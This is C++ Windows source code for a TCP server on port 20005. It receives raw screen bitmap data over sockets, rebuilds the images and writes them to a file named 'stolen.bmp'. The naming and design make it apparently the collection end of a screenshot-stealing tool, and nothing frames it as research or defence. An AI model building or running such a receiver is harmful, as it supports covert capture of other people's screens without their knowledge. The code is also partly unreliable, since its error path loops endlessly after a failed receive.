#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#include <optional>
#include <filesystem>
#include <filesystem>

#pragma comment (lib, "Ws2_32.lib")

#include "Packet.h"

void readPacketPayload(Packet& packet, const char* buffer, int size) {
    packet.payload.insert(packet.payload.end(), buffer, buffer + size);
}

bool saveBmp(HBITMAP hBitmap, const std::filesystem::path filePath) {
    BITMAP bmp;
    if (GetObject(hBitmap, sizeof(BITMAP), &bmp)) {
        HDC hDC = CreateCompatibleDC(NULL);
        SelectObject(hDC, hBitmap);
        int bitsPerPixel = bmp.bmBitsPixel;
        int bytesPerPixel = bitsPerPixel / 8;
        int bitmapSize = bmp.bmWidth * bmp.bmHeight * bytesPerPixel;
        char* bitmapData = new char[bitmapSize];
        BITMAPFILEHEADER bfh;
        BITMAPINFOHEADER bih;
        bih.biSize = sizeof(BITMAPINFOHEADER);
        bih.biWidth = bmp.bmWidth;
        bih.biHeight = bmp.bmHeight;
        bih.biPlanes = 1;
        bih.biBitCount = bitsPerPixel;
        bih.biCompression = BI_RGB;
        bih.biSizeImage = 0;
        bih.biXPelsPerMeter = 0;
        bih.biYPelsPerMeter = 0;
        bih.biClrUsed = 0;
        bih.biClrImportant = 0;
        bfh.bfType = 0x4D42;
        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bfh.bfSize = bfh.bfOffBits + bitmapSize;
        if (GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, bitmapData, (BITMAPINFO*)&bih, DIB_RGB_COLORS)) {
            FILE* file = fopen(filePath.string().c_str(), "wb");
            if (file) {
                fwrite(&bfh, sizeof(BITMAPFILEHEADER), 1, file);
                fwrite(&bih, sizeof(BITMAPINFOHEADER), 1, file);
                fwrite(bitmapData, 1, bitmapSize, file);
                fclose(file);
                delete[] bitmapData;
                DeleteDC(hDC);
                return true;
            }
        }
        delete[] bitmapData;
        DeleteDC(hDC);
    }
    return false;
}

HBITMAP reassembleBitmap(const Packet& packet) {
    BITMAPINFOHEADER bi = { 0 };
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biPlanes = 1;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    HDC hDC = GetDC(NULL);
    if (hDC == NULL)
        return NULL;

    bi.biWidth = packet.biWidth;
    bi.biHeight = packet.biHeight;
    bi.biBitCount = packet.biBitCount;

    HBITMAP hBitmap = CreateCompatibleBitmap(hDC, bi.biWidth, bi.biHeight);
    if (hBitmap == NULL) {
        ReleaseDC(NULL, hDC);
        return NULL;
    }

    bi.biSizeImage = ((bi.biWidth * bi.biBitCount + 31) / 32) * 4 * bi.biHeight;

    if (!SetDIBits(hDC, hBitmap, 0, bi.biHeight, packet.payload.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
        DeleteObject(hBitmap);
        ReleaseDC(NULL, hDC);
        return NULL;
    }

    ReleaseDC(NULL, hDC);
    return hBitmap;
}

std::optional<Packet> readPacket(SOCKET clientSocket) {
    Packet result;

    constexpr size_t bufferLen = 512;
    char buffer[bufferLen];

    bool sizeChunkRead{ false };

    while (true) {
        auto receivedBytes = recv(clientSocket, buffer, bufferLen, 0);
        if (receivedBytes > 0) {
            if (!sizeChunkRead) {
                result.biWidth = *reinterpret_cast<Packet::size_t*>(buffer);
                result.biHeight = *reinterpret_cast<Packet::size_t*>(
                    buffer + sizeof(Packet::size_t));
                result.biBitCount = *reinterpret_cast<Packet::size_t*>(
                    buffer + sizeof(Packet::size_t) * 2);
                result.payloadSize = *reinterpret_cast<Packet::size_t*>(
                    buffer + sizeof(Packet::size_t) * 3);
                sizeChunkRead = true;
                readPacketPayload(
                    result, 
                    buffer + sizeof(Packet::size_t) * 4,
                    receivedBytes - sizeof(Packet::size_t) * 4);
            }
            else {
                readPacketPayload(result, buffer, receivedBytes);
            }
        }
        else if (receivedBytes == 0) {
            break;
        }
        else {
            printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(clientSocket);
        }
    };

    if (shutdown(clientSocket, SD_SEND) == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(clientSocket);
    }

    closesocket(clientSocket);

    if (result.payloadSize == result.payload.size()) {
        return std::move(result);
    }
    return std::nullopt;
}

void handleConnection(SOCKET clientSocket) {
    auto packet = readPacket(clientSocket);
    if (packet) {
        saveBmp(reassembleBitmap(*packet), "stolen.bmp");

        printf("biWidth: %d\n", packet->biWidth);
        printf("biHeight: %d\n", packet->biHeight);
        printf("biBitCount: %d\n", packet->biBitCount);
        printf("payloadSize: %d\n", packet->payloadSize);
    }
}

void mainloop(SOCKET serverSocket) {
    while (true) {
        SOCKET clientSocket = accept(serverSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(serverSocket);
            WSACleanup();
        }
        handleConnection(clientSocket);
    }
}

int main()
{
    WSADATA wsaData;

    SOCKET ListenSocket = INVALID_SOCKET;

    struct addrinfo* address = NULL;
    struct addrinfo hints;

    if (auto result = WSAStartup(MAKEWORD(2, 2), &wsaData); result) {
        printf("WSAStartup failed with error: %d\n", result);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    auto port = "20005";
    if (auto result = getaddrinfo(NULL, port, &hints, &address); result) {
        printf("getaddrinfo failed with error: %d\n", result);
        WSACleanup();
        return 1;
    }

    ListenSocket = socket(
        address->ai_family,
        address->ai_socktype,
        address->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(address);
        WSACleanup();
        return 1;
    }

    auto result = bind(ListenSocket, address->ai_addr, (int)address->ai_addrlen);
    if (result == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(address);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(address);

    result = listen(ListenSocket, SOMAXCONN);
    if (result == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    mainloop(ListenSocket);

    closesocket(ListenSocket);
    WSACleanup();

    return 0;
}